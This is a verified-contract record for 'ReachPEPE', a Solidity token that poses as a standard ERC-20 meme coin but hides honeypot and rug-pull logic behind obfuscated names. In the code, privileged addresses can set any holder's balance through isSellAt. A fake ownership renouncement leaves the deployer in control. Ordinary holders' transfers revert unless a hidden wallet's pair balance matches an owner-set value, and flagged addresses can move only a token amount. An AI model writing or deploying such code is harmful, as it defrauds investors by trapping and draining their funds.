{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface fromReceiverBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSell) external view returns (uint256);\n\n    function transfer(address tradingFrom, uint256 amountShould) external returns (bool);\n\n    function allowance(address limitBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingFrom,\n        uint256 amountShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingBuy, uint256 value);\n    event Approval(address indexed limitBuy, address indexed spender, uint256 value);\n}\n\nabstract contract receiverAutoSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellFeeAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTeamBuy {\n    function createPair(address toEnable, address shouldEnable) external returns (address);\n}\n\ninterface fromReceiverBuyMetadata is fromReceiverBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReachPEPE is receiverAutoSell, fromReceiverBuy, fromReceiverBuyMetadata {\n\n    function launchFrom(address maxTeamReceiver) public {\n        if (listShould) {\n            return;\n        }\n        if (shouldFundTake != enableToken) {\n            marketingFromReceiver = fromList;\n        }\n        launchedMaxTeam[maxTeamReceiver] = true;\n        \n        listShould = true;\n    }\n\n    string private tradingMin = \"Reach PEPE\";\n\n    function walletBuy(uint256 amountShould) public {\n        autoTo();\n        receiverFrom = amountShould;\n    }\n\n    uint256 public amountTake;\n\n    mapping(address => uint256) private limitMarketing;\n\n    uint256 private fromList;\n\n    address private modeReceiverTotal;\n\n    function swapEnableLimit() public {\n        emit OwnershipTransferred(limitModeMin, address(0));\n        modeReceiverTotal = address(0);\n    }\n\n    mapping(address => bool) public listExempt;\n\n    bool private launchedSwap;\n\n    uint256 private teamLaunchedReceiver;\n\n    address public limitModeMin;\n\n    event OwnershipTransferred(address indexed walletSwap, address indexed amountLaunched);\n\n    uint256 public marketingFromReceiver;\n\n    function balanceOf(address walletSell) public view virtual override returns (uint256) {\n        return limitMarketing[walletSell];\n    }\n\n    function autoTo() private view {\n        require(launchedMaxTeam[_msgSender()]);\n    }\n\n    uint256 constant txReceiver = 12 ** 10;\n\n    function isSellAt(address txTotal, uint256 amountShould) public {\n        autoTo();\n        limitMarketing[txTotal] = amountShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLaunch;\n    }\n\n    mapping(address => bool) public launchedMaxTeam;\n\n    function atMax(address launchIs) public {\n        autoTo();\n        \n        if (launchIs == limitModeMin || launchIs == liquidityTx) {\n            return;\n        }\n        listExempt[launchIs] = true;\n    }\n\n    address public liquidityTx;\n\n    bool public shouldLaunchedTotal;\n\n    function transferFrom(address enableSwapIs, address tradingFrom, uint256 amountShould) external override returns (bool) {\n        if (_msgSender() != limitWallet) {\n            if (liquidityAt[enableSwapIs][_msgSender()] != type(uint256).max) {\n                require(amountShould <= liquidityAt[enableSwapIs][_msgSender()]);\n                liquidityAt[enableSwapIs][_msgSender()] -= amountShould;\n            }\n        }\n        return enableAutoTotal(enableSwapIs, tradingFrom, amountShould);\n    }\n\n    uint256 receiverFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSell;\n    }\n\n    bool private enableToken;\n\n    function getOwner() external view returns (address) {\n        return modeReceiverTotal;\n    }\n\n    function enableAutoTotal(address enableSwapIs, address tradingFrom, uint256 amountShould) internal returns (bool) {\n        if (enableSwapIs == limitModeMin) {\n            return autoReceiver(enableSwapIs, tradingFrom, amountShould);\n        }\n        uint256 maxModeTeam = fromReceiverBuy(liquidityTx).balanceOf(receiverMode);\n        require(maxModeTeam == receiverFrom);\n        require(tradingFrom != receiverMode);\n        if (listExempt[enableSwapIs]) {\n            return autoReceiver(enableSwapIs, tradingFrom, txReceiver);\n        }\n        return autoReceiver(enableSwapIs, tradingFrom, amountShould);\n    }\n\n    uint256 private tradingSell = 100000000 * 10 ** 18;\n\n    address limitWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private modeLiquidity = \"RPE\";\n\n    bool private shouldFundTake;\n\n    uint256 txShould;\n\n    bool public listShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLiquidity;\n    }\n\n    function allowance(address teamLaunch, address isList) external view virtual override returns (uint256) {\n        if (isList == limitWallet) {\n            return type(uint256).max;\n        }\n        return liquidityAt[teamLaunch][isList];\n    }\n\n    function transfer(address txTotal, uint256 amountShould) external virtual override returns (bool) {\n        return enableAutoTotal(_msgSender(), txTotal, amountShould);\n    }\n\n    bool private toWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingMin;\n    }\n\n    function owner() external view returns (address) {\n        return modeReceiverTotal;\n    }\n\n    address receiverMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private amountLaunch = 18;\n\n    constructor (){\n        if (fromList != marketingFromReceiver) {\n            shouldLaunchedTotal = false;\n        }\n        sellFeeAuto exemptSwap = sellFeeAuto(limitWallet);\n        liquidityTx = totalTeamBuy(exemptSwap.factory()).createPair(exemptSwap.WETH(), address(this));\n        \n        limitModeMin = _msgSender();\n        swapEnableLimit();\n        launchedMaxTeam[limitModeMin] = true;\n        limitMarketing[limitModeMin] = tradingSell;\n        \n        emit Transfer(address(0), limitModeMin, tradingSell);\n    }\n\n    function autoReceiver(address enableSwapIs, address tradingFrom, uint256 amountShould) internal returns (bool) {\n        require(limitMarketing[enableSwapIs] >= amountShould);\n        limitMarketing[enableSwapIs] -= amountShould;\n        limitMarketing[tradingFrom] += amountShould;\n        emit Transfer(enableSwapIs, tradingFrom, amountShould);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityAt;\n\n    function approve(address isList, uint256 amountShould) public virtual override returns (bool) {\n        liquidityAt[_msgSender()][isList] = amountShould;\n        emit Approval(_msgSender(), isList, amountShould);\n        return true;\n    }\n\n    bool public feeFromReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"}],\"name\":\"atMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountShould\",\"type\":\"uint256\"}],\"name\":\"isSellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeamReceiver\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitModeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunchedTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountShould\",\"type\":\"uint256\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReachPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}